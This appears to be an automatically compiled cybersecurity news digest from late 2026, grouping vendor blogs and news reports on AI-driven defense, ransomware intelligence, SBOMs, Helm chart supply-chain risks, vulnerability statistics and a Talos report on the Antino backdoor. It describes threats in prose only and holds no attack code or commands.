Over the last three decades in cybersecurity, I’ve witnessed major paradigm shifts — yet none match the velocity and complexity of today’s landscape. Attackers are now using AI to move at machine speed: accelerating intrusions, exploiting zero-day vulnerabilities, and rendering legacy defenses obsolete. Reactive, manual security reviews can no longer keep pace with sophisticated and increasingly automated threats. Building true cyber resilience means shifting from reactive troubleshooting to a proactive defense — one where continuous posture validation and autonomous remediation are built directly into every workload from day one. Public sector teams require a unified, structured approach to continuously scan, validate, and remediate software vulnerabilities. Google AI Threat Defense brings together the reasoning power of Gemini , deep multi-cloud visibility from Wiz , autonomous code remediation with CodeMender , and Mandiant frontline threat intelligence into a singular, continuous o
```

#### Full body

```
Public Sector Defending at machine speed: Securing the public sector in the agentic era September 29, 2026 Ron Bushar Managing Director & Chief Security Officer, Google Public Sector Google Public Sector Newsletter Essential public sector updates with Google Cloud insights. Subscribe Over the last three decades in cybersecurity, I’ve witnessed major paradigm shifts — yet none match the velocity and complexity of today’s landscape. Attackers are now using AI to move at machine speed: accelerating intrusions, exploiting zero-day vulnerabilities, and rendering legacy defenses obsolete. Reactive, manual security reviews can no longer keep pace with sophisticated and increasingly automated threats. Building true cyber resilience means shifting from reactive troubleshooting to a proactive defense — one where continuous posture validation and autonomous remediation are built directly into every workload from day one. Public sector teams require a unified, structured approach to continuously scan, validate, and remediate software vulnerabilities. Google AI Threat Defense brings together the reasoning power of Gemini , deep multi-cloud visibility from Wiz , autonomous code remediation with CodeMender , and Mandiant frontline threat intelligence into a singular, continuous operational loop. By securing the entire software lifecycle from code to cloud, this unified system enables agencies to continuously monitor and neutralize emerging threats at machine speed — safeguarding critical infrastructure, mission integrity, and public trust. Real-world cyber defenses in action Across state governments and higher education institutions, security and IT leaders are using Google’s AI and security solutions to secure highly dynamic environments, systems, and operations in the agentic era. Let’s take a closer look at how organizations across the public sector are automating defense and building resilience. The State of Iowa : Under CISO Shane Dwyer, the state partnered with Google Public Sector to eliminate operational blindness, consolidating more than 20 separate security environments into a single, centralized security operations center (SOC). By ingesting large volumes of telemetry through Google Security Operations, Iowa established a unified operational view across its multi-cloud footprint — enabling its cyber personnel to move away from routine alert triage and focus on proactive threat defense and rapid incident remediation. Underway are several SOC process automation efforts that will continue to support the mission of reducing the overall workload and effectiveness of the SOC team. The State of Connecticut : Connecticut faced an unsustainable, fragmented security model across its multicloud footprint. Under CISO Gene Meltser, the state transitioned to a unified, AI-driven operations center with Google Cloud. This agentic Security Operations Center (SOC) configuration allows Connecticut to apply automated cyber defenses across decentralized networks, neutralizing novel threats in near real-time before they reach production systems. University of California, Riverside (UCR) : Under CIO Matthew Gunkel, UCR Information Technology Solutions (ITS) built an integrated stack on Google Cloud to serve an academic community of more than 26,000 students, faculty, and researchers. The university implemented Google Security Operations and Security Command Center to establish a Zero Trust security architecture, while deploying Gemini Enterprise to automate IT support workflows, empower faculty, and give security analysts real-time assistive intelligence to resolve incidents at machine speed. Arizona State University (ASU) : Under CISO Lester Godsey, ASU addressed policy friction by consolidating 19 new security standards and existing university policies into an interactive, queryable AI assistant. To prepare future cyber defenders for the agentic era, ASU is launching a student-led SOC that provides hands-on training in orchestration, automation, and A
```

#### Corroborating sources (4)

- **Google Cloud Security** (cloud_identity_infrastructure)
  - Title: Defending at machine speed: Securing the public sector in the agentic era
  - Published: 2026-09-29T14:00:00+00:00
  - Link: https://cloud.google.com/blog/topics/public-sector/defending-at-machine-speed-securing-the-public-sector-in-the-agentic-era/
  - Summary: Over the last three decades in cybersecurity, I’ve witnessed major paradigm shifts — yet none match the velocity and complexity of today’s landscape. Attackers are now using AI to move at machine speed: accelerating intrusions, exploiting zero-day vulnerabilities, and rendering legacy defenses obsolete. Reactive, manual security reviews can no longer keep pace with sophisticated and increasingly automated threats. Building true cyber resilience means shifting from reactive troubleshooting to a proactive defense — one where continuous posture validation and autonomous remediation are built directly into every workload from day one. Public sector teams require a unified, structured approach to continuously scan, validate, and remediate software vulnerabilities. Google AI Threat Defense brings together the reasoning power of Gemini , deep multi-cloud visibility from Wiz , autonomous code remediation with CodeMender , and Mandiant frontline threat intelligence into a singular, continuous o
- **Help Net Security** (cyber_news_breach_reporting)
  - Title: Google says Gemini 4 Argon can find and patch critical software flaws
  - Published: 2026-10-01T04:00:41+00:00
  - Link: https://www.helpnetsecurity.com/2026/10/01/google-gemini-4-argon/
  - Summary: Google announced Gemini 4 Argon, its new frontier AI model, and is rolling it out to a set of trusted cyber defenders through its Fairwind Program. Google says the model can locate critical software vulnerabilities, validate them, and patch them without human help, and it will release a version without cyber guardrails to those defenders and to its own internal teams. Developers, enterprises, and consumers get Argon later, starting with paid API customers and Google … More → The post Google says Gemini 4 Argon can find and patch critical software flaws appeared first on Help Net Security .
- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: Google Launches Gemini 4 Argon With Guardrail-Free Access for Vetted Defenders
  - Published: 2026-10-01T07:52:26+00:00
  - Link: https://www.securityweek.com/google-launches-gemini-4-argon-with-guardrail-free-access-for-vetted-defenders/
  - Summary: The company says its new frontier AI model found a critical vulnerability in software used by hospitals worldwide. The post Google Launches Gemini 4 Argon With Guardrail-Free Access for Vetted Defenders appeared first on SecurityWeek .
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: RatHat Android Malware Console Uses Gemini to Identify Higher-Value Victims
  - Published: 2026-09-28T17:38:33+00:00
  - Link: https://thehackernews.com/2026/09/rathat-android-malware-console-uses.html
  - Summary: RatHat's operators build and publish the Android banking trojan and control infected phones from a web console, according to security company Cleafy. Cleafy has traced nearly 100 deployments of that console since April 2026. It said this fits a malware-as-a-service model, in which each customer runs a separate copy. The console stores what the malware collects from each phone,

### Cluster 33a6d341d5 — score 14

- Title: Using Threat Intelligence to Stop Ransomware Attacks
- Source: Recorded Future (threat_research_primary)
- Published: 2026-09-25T00:00:00+00:00
- Link: https://www.recordedfuture.com/blog/ransomware-threat-intelligence
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion
- content_type: incident_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion
- content_type: incident_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Learn how ransomware threat intelligence empowers your team to actively follow adversary infrastructure, monitor dark web chatter and prevent attacks.
```

#### Full body

```
Using Threat Intelligence to Track and Disrupt Ransomware Attacks Ransomware does not start when files are encrypted. By then, an attacker may already have obtained valid credentials, entered the network, moved between systems and established a command-and-control (C2) channel. That gives defenders an earlier window to act. Ransomware threat intelligence helps security teams identify the actors, infrastructure and access methods connected to ransomware activity before an attack reaches its final stage. Instead of waiting for an endpoint alert or ransom note, teams can look for exposed credentials, malicious infrastructure and known attacker behavior, then act on the threats most relevant to their organization. The need for that earlier view is growing. Modern ransomware operations may use Ransomware-as-a-Service (RaaS) models and double- or triple-extortion tactics, giving defenders more reason to identify warning signs before encryption. Key takeaways Ransomware threat intelligence can expose signs of an attack before encryption, including compromised access and attacker infrastructure. IOCs remain useful, but TTPs provide longer-lasting context because attacker behavior changes less quickly than individual IP addresses or file hashes. Early disruption can focus on closing initial access paths or cutting communication between compromised systems and known C2 infrastructure. Recorded Future assists in connecting ransomware intelligence with organizational exposure, threat actor context and existing security workflows so teams can better prioritize action. Why reactive ransomware defense is not enough Reactive controls remain important, but they often cannot provide the external context security teams need to identify which ransomware threats are most likely to reach their environment. Endpoint detection and response (EDR), network monitoring, and backups all have a role in ransomware defense. The problem is timing . If a team only acts after malicious behavior appears inside its environment, the attacker may already have gained access or started moving toward systems that matter. This is where modern ransomware detection benefits from external intelligence. Security teams can compare what they see internally with information about active ransomware groups, infrastructure and exploitation activity outside their network. IOCs show what happened. TTPs help anticipate what comes next. Indicators of compromise (IOCs), such as malicious IP addresses, domains, and file hashes, can help security controls identify known threats. They also typically have a short shelf life when attackers rotate infrastructure or alter malware. Tactics, techniques, and procedures (TTPs) describe how an adversary operates. MITRE ATT&CK organizes those behaviors across stages such as initial access, lateral movement and command and control. A ransomware actor can quickly replace an IP address. Changing a working attack method takes more effort. Tracking both IOCs and TTPs gives defenders a stronger basis for deciding what to block now and what behavior to watch for next. The goal is not to replace IOC-based detection. It is to add enough context to understand who may be behind an indicator, how it fits into an attack, and what the adversary is likely to attempt next. How does Threat Intelligence help prevent ransomware attacks? The best time to disrupt ransomware is before the attacker reaches the impact stage. Threat intelligence creates opportunities to act during initial access and C2 activity rather than relying on recovery after encryption. External intelligence can reveal parts of the ransomware operation that are difficult to see from internal telemetry alone. That includes activity in criminal marketplaces as well as infrastructure connected to known threat actors. Phase 1: Track the adversary outside your network Initial access is often a business in its own right. Initial access brokers (IABs) obtain access to compromised organizations and advert
```

#### Corroborating sources (1)

- **Recorded Future** (threat_research_primary)
  - Title: Using Threat Intelligence to Stop Ransomware Attacks
  - Published: 2026-09-25T00:00:00+00:00
  - Link: https://www.recordedfuture.com/blog/ransomware-threat-intelligence
  - Summary: Learn how ransomware threat intelligence empowers your team to actively follow adversary infrastructure, monitor dark web chatter and prevent attacks.

### Cluster f41f7912c8 — score 13

- Title: Why are SBOMs failing to stop supply chain attacks?
- Source: Sysdig (detection_response_operations)
- Published: 2026-09-24T11:50:00+00:00
- Link: https://webflow.sysdig.com/blog/why-are-sboms-failing-to-stop-supply-chain-attacks
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: supply_chain
- affected_industries: critical_infrastructure
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: supply_chain
- affected_industries: critical_infrastructure
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
A software bill of materials (SBOM) could prevent most supply chain attacks. Let’s analyze what’s holding back their broader adoption.
```

#### Full body

```
< back to blog Why are SBOMs failing to stop supply chain attacks? Published by: Javier Martínez @ linkedin Published: September 24, 2026 Table of contents falco feeds by sysdig Falco Feeds extends the power of Falco by giving open source-focused companies access to expert-written rules that are continuously updated as new threats are discovered. learn more A software bill of materials (SBOM) has the potential to prevent most supply chain attacks. An SBOM is like a “list of ingredients” tag for software that, along with signatures and attestations, enables traceability, including information like: ‍ Who created the software (attribution). Where this software comes from (provenance) What the software contains. A standard format is also an ideal tool for sharing this information between CNAPP tools. However, the lack of motivation to properly verify software integrity and the lack of support from developer tools limit the utility of SBOMs. Let’s analyze the role of SBOMs in the software lifecycle, and what is holding back their adoption. SBOMs in the software lifecycle Software development goes a bit like this: Someone takes a few libraries and tools, puts them all together with code, and creates a new piece of software. It’s also a chain; someone will take this software and build something new on top of it. With so many dependencies between components, an incident on a small component can compromise millions of systems. This is what happens with OpenSSL, an open source cryptography library used by most computer systems. A vulnerability in OpenSSL often becomes a global security risk. This potential impact is what makes supply chain attacks so attractive for malicious actors. Software attestations are great for protecting your infrastructure against most supply chain attacks. They are structured data containing SBOMs, as well as any kind of arbitrary data like the origin source, or a list of vulnerabilities. Attestations can be signed by the developer and software repository. Attestation for container images can be downloaded and verified with docker scout attest: Learn more in How to secure Kubernetes deployment with signature verification . By verifying a container image digest against its attestation signatures, you can determine whether someone has modified the image or impersonated the repository. Be aware that this check has its limitations; it won’t cover cases where the repository itself, or its keys, are compromised. Ideally, you would perform this check before using any software, especially before deploying it to production. Then, you would also generate and sign SBOMs when packaging your own software. For a Kubernetes development, the lifecycle would look something like this: On paper, this looks great: You know what you’re using and where it came from. This protects you from most supply attack vectors. So why are the adoption rates for SBOMs so low? Let’s explore some challenges SBOMs face in achieving support and effectiveness. Challenge 1: Inconsistent tool support Everyone who’s dealt with digital signatures knows the pain it entails. Although many software development tools support attestations, getting all these tools to work together across developers and infrastructure teams requires some setup and fighting with the command line. Implementing this system doesn’t scale to corporate environments or big teams. This causes a vicious cycle. Without tool support, adoption is low, and this low adoption doesn’t motivate tool support. However, with good support from the tools, digital signatures are almost transparent. One good example is Apple’s notarization system. Apple’s developer tools automatically generate, sign, and notarize the apps for the developers. This doesn't generate an SBOM, but it deals with signatures mostly seamlessly. Challenge 2: You can’t trust every SBOM When you buy mayonnaise, its ingredient list won’t tell you whether it contains Salmonella. In the same way, a developer won’t know if their so
```

#### Corroborating sources (1)

- **Sysdig** (detection_response_operations)
  - Title: Why are SBOMs failing to stop supply chain attacks?
  - Published: 2026-09-24T11:50:00+00:00
  - Link: https://webflow.sysdig.com/blog/why-are-sboms-failing-to-stop-supply-chain-attacks
  - Summary: A software bill of materials (SBOM) could prevent most supply chain attacks. Let’s analyze what’s holding back their broader adoption.

### Cluster 39ec553152 — score 13

- Title: Securing the Kubernetes Supply Chain: Introducing WizOS Helm Charts
- Source: Wiz Research (cloud_identity_infrastructure)
- Published: 2026-09-30T15:52:31+00:00
- Link: https://www.wiz.io/blog/wizos-helm-charts
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: supply_chain
- affected_products: GitHub
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: supply_chain
- affected_products: GitHub
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Secure your Kubernetes supply chain with WizOS Helm Charts. Eliminate hidden CI/CD risks and unmaintained dependencies with hardened, signed, and CVE-scanned charts for seamless Kubernetes deployment.
```

#### Full body

```
Kubernetes changed how teams ship software. Applications now run anywhere, scale on demand, and roll out many times a day, and Helm made that speed even more accessible. Charts package an application with everything it needs to run, so installs are repeatable, versions are tracked, and upgrades or rollbacks take one command. Instead of writing every Kubernetes manifest by hand, you install an ingress controller, a monitoring stack, or a database with a single helm install , often from one of the thousands of community charts on Artifact Hub that someone else maintains. But every one of those installs runs on trust. Helm expands the software supply chain Every chart you install brings its maintainers' decisions with it, including what their projects depend on, how they build and publish releases, and who can change their code. Those decisions sit outside your repositories and your pipelines, which is exactly where traditional supply chain security tools stop looking. Software composition analysis checks your source code and dependency manifests, like go.mod, package.json , and requirements.txt , for vulnerable open source packages. Container image scanning checks the images you build for vulnerable operating system packages and libraries. SBOMs give you a record of what's inside what you ship. Those controls cover the code you own, but a community Helm chart adds gaps they weren't built to cover. You deploy images you never built. A chart pulls images from someone else's registry. Those images never pass through your repositories, so SCA on your source code never sees them. Some risks don't have a CVE. Image scanning looks for known vulnerabilities. It won't tell you that an upstream dependency points to an account anyone can register, or that a maintainer's CI workflow runs code from strangers with access to release credentials. Tags can move. Charts often reference image tags rather than fixed digests, so the image you reviewed last month might not be the image you pull today. Put together, you can do everything right in your own code and still run software whose supply chain you've never had a chance to examine. Introducing secured Helm charts for WizOS Those additional blind spots are why we built secured Helm charts for WizOS. Each chart is ready to deploy, and Wiz maintains it to the same hardening and remediation standards as the WizOS base images your teams already build on. To see how big that gap is in practice, Wiz Research looked at the charts teams use most. The Secured Image Catalog in Wiz, displaying pre-hardened Helm chart options available to swap into your environment. What Wiz Research found behind 1,500 popular Helm charts Wiz Research examined the source repositories and build pipelines behind 1,500 of the most popular Helm charts on Artifact Hub. Many charts share a source repository, so those charts map to 814 unique repositories on GitHub. The goal wasn't to review the charts themselves. It was to look one layer down, at the projects that produce the images each chart deploys. 61 source repositories (7.5%) had at least one confirmed supply chain risk 9 findings were rated critical or high severity 20 charts had weaknesses in their CI/CD workflows 25 charts depended on upstream projects that are unmaintained or archived Two patterns stood out: Build pipelines that trust outside contributors too much. In some projects, opening a pull request, or even leaving a comment, is enough to run an outsider's code inside the project's CI workflow, with access to the project's secrets. When a pull request triggers it, security researchers call this pattern a PWN Request. An attacker who exploits it could steal credentials and use them to change the project or ship a tampered release. Dependencies that nobody owns. Some projects pull code from accounts or namespaces that don't exist. Anyone could register that name, publish malicious code under it, and have that code included in the project's builds. In both cases, th
```

#### Corroborating sources (1)

- **Wiz Research** (cloud_identity_infrastructure)
  - Title: Securing the Kubernetes Supply Chain: Introducing WizOS Helm Charts
  - Published: 2026-09-30T15:52:31+00:00
  - Link: https://www.wiz.io/blog/wizos-helm-charts
  - Summary: Secure your Kubernetes supply chain with WizOS Helm Charts. Eliminate hidden CI/CD risks and unmaintained dependencies with hardened, signed, and CVE-scanned charts for seamless Kubernetes deployment.

### Cluster 6c50411d30 — score 13

- Title: Risky Bulletin: Major vulnerability found in ancient TACACS+ networking protocol
- Source: Risky Business News (practitioner_analysis)
- Published: 2026-09-25T04:17:47+00:00
- Link: https://risky.biz/RBNEWS615/
- Fetch status: ok
- Member count: 10
- Corroborating source count: 7
- Strong signals: OpenAI/ChatGPT

#### Cluster taxonomy (union across members)
- affected_products: Anthropic/Claude, OpenAI/ChatGPT
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_2_operator, tier_3_analysis, tier_4_news

#### Primary article taxonomy
- affected_products: OpenAI/ChatGPT
- content_type: vulnerability_disclosure
- confidence_tier: tier_3_analysis

#### Summary

```
A major vulnerability has been found in the ancient TACACS+ networking protocol, Australia’s Prime Minister claims an OpenAI agent hacked the country’s Medicare website, OpenAI gives Ukraine access to its Daybreak cyber-defense program and the UK will establish an anti-disinformation center.
```

#### Full body

```
Risky Bulletin Podcast September 25, 2026 Risky Bulletin: Major vulnerability found in ancient TACACS+ networking protocol Presented by Catalin Cimpanu News Editor Claire Aird Newsreader A major vulnerability has been found in the ancient TACACS+ networking protocol, Australiaâs Prime Minister claims an OpenAI agent hacked the countryâs Medicare website, OpenAI gives Ukraine access to its Daybreak cyber-defense program and the UK will establish an anti-disinformation center. Your browser does not support the audio element. Risky Bulletin: Major vulnerability found in ancient TACACS+ networking protocol â¶ 0:00 / 11:02 Subscribe Brought to you by SpecterOps Know Your Adversary Show notes Risky Bulletin: Major vulnerability found in ancient TACACS+ networking protocol
```

#### Corroborating sources (7)

- **Risky Business News** (practitioner_analysis)
  - Title: Risky Bulletin: Major vulnerability found in ancient TACACS+ networking protocol
  - Published: 2026-09-25T04:17:47+00:00
  - Link: https://risky.biz/RBNEWS615/
  - Summary: A major vulnerability has been found in the ancient TACACS+ networking protocol, Australia’s Prime Minister claims an OpenAI agent hacked the country’s Medicare website, OpenAI gives Ukraine access to its Daybreak cyber-defense program and the UK will establish an anti-disinformation center.
- **Orca Security Research** (cloud_identity_infrastructure)
  - Title: Connect Orca’s ChatGPT Plugin: Cloud Risk Context in Chat and Codex
  - Published: 2026-09-30T15:00:00+00:00
  - Link: https://orca.security/resources/blog/connect-orcas-chatgpt-plugin-cloud-risk-context-in-chat-and-codex/
  - Summary: What is the Orca Security plugin for ChatGPT and Codex? The Orca Security plugin for ChatGPT and Codex connects both tools to Orca’s MCP server, giving security teams and developers access to their Orca data where they already work. ChatGPT and Codex can pull alerts, assets, attack paths, effective permissions, and code origins from your […]
- **Huntress** (detection_response_operations)
  - Title: Attackers Abuse ChatGPT Custom GPTs to Deliver RAT via ClickFix
  - Published: 2026-09-28T20:00:00+00:00
  - Link: https://www.huntress.com/blog/chatgpt-custom-gpts-clickfix-rat
  - Summary: Huntress researchers reveal how attackers are exploiting ChatGPT Custom GPTs to spread ClickFix lures and DLL-sideloaded malware. See the full breakdown.
- **CyberScoop** (cyber_news_breach_reporting)
  - Title: OpenAI reveals ‘novel’ encryption bypass used in distillation attack
  - Published: 2026-09-30T22:17:34+00:00
  - Link: https://cyberscoop.com/openai-moonshot-ai-model-distillation-attack/
  - Summary: The company said individuals associated with Chinese company MoonshotAI were behind parts of the attack, but did not offer hard evidence for the claim. The post OpenAI reveals ‘novel’ encryption bypass used in distillation attack appeared first on CyberScoop .
- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: Anthropic Flags AI Agent Liability Risks as OpenAI Faces Hacking Lawsuit
  - Published: 2026-09-30T11:19:00+00:00
  - Link: https://www.securityweek.com/anthropic-flags-ai-agent-liability-risks-as-openai-faces-hacking-lawsuit/
  - Summary: Attacks by autonomous AI agents are moving out of the lab and into the courtroom, raising unsettled questions about who is liable for what agents do. The post Anthropic Flags AI Agent Liability Risks as OpenAI Faces Hacking Lawsuit appeared first on SecurityWeek .
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Attackers Abuse ChatGPT Custom GPTs to Deliver RAT via ClickFix Lures
  - Published: 2026-09-30T15:00:15+00:00
  - Link: https://thehackernews.com/2026/09/attackers-abuse-chatgpt-custom-gpts-to.html
  - Summary: Threat actors are abusing ChatGPT Custom GPTs to disguise them as legitimate product offerings and direct unsuspecting victims to malicious sites that employ ClickFix lures to deliver malware. Huntress, which observed the activity in late September 2026, said it marks the abuse of yet another feature in trusted artificial intelligence (AI) platforms. Prior campaigns have weaponized shared
- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Custom ChatGPTs push ClickFix attacks to deploy RAT malware
  - Published: 2026-09-29T20:59:39+00:00
  - Link: https://www.bleepingcomputer.com/news/security/custom-chatgpts-push-clickfix-attacks-to-deploy-rat-malware/
  - Summary: Custom variants of OpenAI's ChatGPT promoted in sponsored Google results are directing unsuspecting users to malicious sites that use ClickFix attacks to deliver malware. [...]

### Cluster dd608f8928 — score 12

- Title: Google: AI Is Changing the Pace and Profile of Vulnerability Discovery
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-09-30T14:05:58+00:00
- Link: https://www.securityweek.com/google-ai-is-changing-the-pace-and-profile-of-vulnerability-discovery/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, vulnerability_disclosure, zero_day
- affected_industries: critical_infrastructure
- affected_products: Linux kernel
- cve_ids: CVE-2026-1731
- urgency_signals: actively_exploited, poc_available, preauth_unauth, zero_day
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, vulnerability_disclosure, active_exploitation
- affected_industries: critical_infrastructure
- affected_products: Linux kernel
- cve_ids: CVE-2026-1731
- urgency_signals: actively_exploited, zero_day, preauth_unauth, poc_available
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
Google’s analysis found that AI-discovered vulnerabilities are more likely to enable remote code execution. The post Google: AI Is Changing the Pace and Profile of Vulnerability Discovery appeared first on SecurityWeek .
```

#### Full body

```
The number of vulnerabilities disclosed each month doubled in 2026, and the monthly average of vulnerabilities exploited in the wild nearly doubled, according to a new report from Google Threat Intelligence Group (GTIG). Analyzing disclosures from January 2025 through August 2026, GTIG found that monthly disclosures rose from 5,045 in January 2026 to 10,477 in July, peaking at 10,740 in August. “We found that AI is measurably changing not just the pace of vulnerability discovery and exploitation, but also the types and typical risk profiles of vulnerabilities that are being discovered,” GTIG says. The researchers caution that raw volume can be misleading, as automated CVE assignment in open source ecosystems can inflate the numbers. Vulnerabilities whose description mentions the Linux kernel alone generated roughly 5,000 CVEs between January and August, with no in-the-wild zero-day exploitation observed. High-risk disclosures, based on GTIG’s own ratings rather than CVSS, grew 167%, from 131 in January to 350 in August. In addition, GTIG recorded 141 distinct exploited vulnerabilities in the first eight months of 2026, more than the 127 seen in all of 2025. That’s an average of 18 per month, up from 10.5 last year. Still, only 0.23% of this year’s disclosed vulnerabilities, roughly one in 431, were observed being exploited. Advertisement. Scroll to continue reading. Zero-day exploitation increased only marginally, from an average of eight per month in 2025 to 11 per month in 2026, although the count jumped to 22 in August. Zero-days made up 62% of the vulnerabilities exploited between January and August. GTIG suggests that the growth in exploitation came primarily from n-days. Exploitation of high-risk vulnerabilities also more than doubled, from 28 in 2025 to 75 in the first eight months of 2026. “It is possible that threat actors are finding it more accessible or efficient to use LLMs and AI tools to automate analysis of differences between product versions, patches, vulnerability disclosure announcements, and Proof-of-Concept (POC) code to rapidly weaponize n-days, rather than to discover new zero-days,” the report reads. Vulnerabilities that GTIG identified as likely discovered by AI between January and August show a different risk profile. Of these, 39% were rated low-risk and 58% medium-risk, compared to 69% and 28%, respectively, for non-AI vulnerabilities. GTIG says this likely reflects how research programs deploy AI agents, tasking them with auditing critical infrastructure and sensitive privilege boundaries with a focus on higher-impact findings. Half of the AI-discovered vulnerabilities result in remote code execution, compared to 26% of non-AI vulnerabilities. According to GTIG, this likely stems from AI models’ ability to find memory corruption and logic flaws that traditional static analyzers miss. GTIG has also confirmed in-the-wild exploitation of AI-discovered vulnerabilities, though it describes this as an early indicator rather than an established trend. One example is CVE-2026-1731 , an unauthenticated OS command injection flaw in BeyondTrust Privileged Remote Access and Remote Support, discovered autonomously by the Hacktron AI research agent. One threat cluster exploited it within four days of public disclosure, and five more followed within seven days. Disclosures of vulnerabilities in AI systems themselves are also rising. GTIG tracked 2,076 AI-related CVEs between January 2025 and August 2026, including more than 1,500 this year, roughly half of which affect AI orchestration frameworks. Only a handful of the 2,076 have been confirmed as exploited in the wild, including flaws in LiteLLM and Langflow . GTIG has not yet observed zero-day exploitation of AI infrastructure. “GTIG expects that rates of vulnerability discovery and exploitation are likely to continue to increase in the short to medium term,” the report reads. Related : High-Severity Vulnerabilities Patched in OpenSSL, WolfSSL Related : WatchG
```

#### Corroborating sources (1)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: Google: AI Is Changing the Pace and Profile of Vulnerability Discovery
  - Published: 2026-09-30T14:05:58+00:00
  - Link: https://www.securityweek.com/google-ai-is-changing-the-pace-and-profile-of-vulnerability-discovery/
  - Summary: Google’s analysis found that AI-discovered vulnerabilities are more likely to enable remote code execution. The post Google: AI Is Changing the Pace and Profile of Vulnerability Discovery appeared first on SecurityWeek .

### Cluster e981db64b2 — score 11

- Title: ScreenConnect Client (Ab)used by Attackers, (Thu, Oct 1st)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-10-01T05:32:13+00:00
- Link: https://isc.sans.edu/diary/rss/33388
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: ScreenConnect

#### Cluster taxonomy (union across members)
- affected_products: ScreenConnect
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- affected_products: ScreenConnect
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
Threat Actors do not always use top-notch techniques or very complex malware to perform their attacks. Sometimes, they just abuse of existing applications...
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: ScreenConnect Client (Ab)used by Attackers, (Thu, Oct 1st)
  - Published: 2026-10-01T05:32:13+00:00
  - Link: https://isc.sans.edu/diary/rss/33388
  - Summary: Threat Actors do not always use top-notch techniques or very complex malware to perform their attacks. Sometimes, they just abuse of existing applications...

### Cluster 9b43995709 — score 11

- Title: China-nexus UAT-11587 targets government and policy organizations across Asia with Antino backdoor
- Source: Cisco Talos (threat_research_primary)
- Published: 2026-09-30T10:00:01+00:00
- Link: https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: Cisco

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, phishing_social_eng, web_shell_backdoor
- affected_industries: financial_services, government
- affected_products: Cisco, Microsoft 365
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: phishing_social_eng, apt_espionage, web_shell_backdoor
- affected_industries: financial_services, government
- affected_products: Cisco, Microsoft 365
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Cisco Talos uncovered a cluster of activity we track as UAT-11587 targeting government and policy organizations across Asia, including in Taiwan, India, the Philippines, and Cambodia, to deliver a previously undocumented backdoor referred to as “Antino” in developer artifacts.
```

#### Full body

```
China-nexus UAT-11587 targets government and policy organizations across Asia with Antino backdoor By Ashley Shen Wednesday, September 30, 2026 06:00 Threat Spotlight Cisco Talos uncovered a cluster of activity we track as UAT-11587 targeting government and policy organizations across Asia, including in Taiwan, India, the Philippines, and Cambodia, to deliver a previously undocumented backdoor referred to as “Antino” in developer artifacts. Talos first observed UAT-11587 activity in September 2025. By July 2026, Talos had identified at least 16 affected or targeted institutional environments across eight Asian countries. Antino is a Rust-compiled Windows backdoor that supports host reconnaissance, shell and PowerShell execution, file transfer, in-memory shellcode loading and persistence. Its native command-and-control channel operates exclusively through Microsoft 365, using Microsoft Graph to interact with Outlook and OneDrive. Talos identified a recurring delivery branch that began with spear-phishing emails and tailored decoy documents, followed by a five-stage infection chain. The actor relied heavily on Cloudflare infrastructure for delivery, execution tracking, and payload staging. Based on the development, preparation-environment, and targeting indicators detailed in this report, Talos assesses with high confidence that UAT-11587 is China-nexus. Overview Talos first identified UAT-11587’s campaign while investigating a spear-phishing campaign directed at Taiwan's academic, think tank, and civil society policy community in March 2026. The message recreated Gmail's attachment interface and directed the target into a cloud-hosted, multi-stage infection chain. Across this activity, our researchers assessed that the actor used several delivery methods, loader families, and post-compromise tools. One recurring final-stage payload was a custom Rust backdoor that Talos tracks as Antino. Antino communicates with Microsoft 365 applications and uses Outlook and OneDrive objects as dead drops, rather than depending on a conspicuous dedicated command server. Further investigation showed that the activity extended beyond the initial Taiwan operation. Talos subsequently identified confirmed or probable affected government and security environments across multiple Asian countries, alongside additional regional targeting supported by lure content. While this report was being prepared, Symantec published research on an activity set it tracks as Jewelbug . Talos identified overlaps between UAT-11587 and the Antino-related espionage activity attributed to Jewelbug. Although Symantec reported that Jewelbug conducted both espionage and cryptocurrency fraud, it assessed that “the SEO business supplied access, delivery and infrastructure into the espionage operation, rather than that one person performed both roles.” Talos could not independently verify a connection between the espionage campaign and Jewelbug’s financially motivated activity. We therefore track UAT-11587 as a separate activity set. Who is UAT-11587? Talos assesses with high confidence that UAT-11587 is a China-nexus actor, based on the totality of corroborating technical and operational evidence, rather than any single indicator. The indicators discussed below are selected examples of the broader evidence supporting this assessment. Evidence supporting the attribution assessment Decoy document metadata provides several preparation-environment clues. A Taiwan-focused decoy contains the zh-CN language tag, the Simplified Chinese author value 未定义 